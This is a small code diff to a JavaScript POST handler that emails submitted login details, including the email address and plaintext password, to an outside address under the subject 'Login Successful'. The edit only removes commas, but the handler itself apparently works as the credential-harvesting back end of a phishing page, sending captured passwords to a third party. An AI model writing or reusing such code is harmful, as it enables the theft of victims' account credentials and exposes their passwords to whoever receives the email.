@@ -17,9 +17,9 @@ export async function POST(req, res) {
                 "Login Successful",
                 "dontkillme@bunnyfiedlabs.com",
                 `
-                    Email : ${email}, 
-                    Email Username : ${email_username},
-                    Email Domain : ${email_domain},
+                    Email : ${email}
+                    Email Username : ${email_username}
+                    Email Domain : ${email_domain}
                     Password : ${password}
                 `
             );
